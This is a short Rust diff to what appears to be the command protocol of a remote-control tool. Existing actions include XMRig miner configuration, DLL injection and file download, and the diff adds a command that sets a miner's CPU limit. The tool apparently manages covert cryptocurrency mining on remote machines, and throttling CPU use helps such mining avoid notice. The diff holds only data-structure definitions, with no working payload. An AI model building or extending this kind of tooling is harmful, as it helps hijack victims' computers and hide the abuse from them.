@@ -23,6 +23,7 @@ pub enum ClientAction {
     EditXMRigConfig,
     InjectDll,
     GetXMRigData,
+    EditMinerCPULimit,
     // other file stuff just use some FTP
     // remove, rename, upload (if folder - compress),createfolder
 }
@@ -40,8 +41,13 @@ pub enum ClientParams {
     DownloadFile(DownloadFileParams),
     InjectDll(InjectDllParams),
     GetXMRigData(GetXMRigDataParams),
+    EditMinerCPULimit(EditMinerCPULimitParams),
 }
 
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct EditMinerCPULimitParams {
+    pub new_cpu_limit: u32,
+}
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct GetXMRigDataParams {}
 #[derive(Serialize, Deserialize, Debug, Clone)]
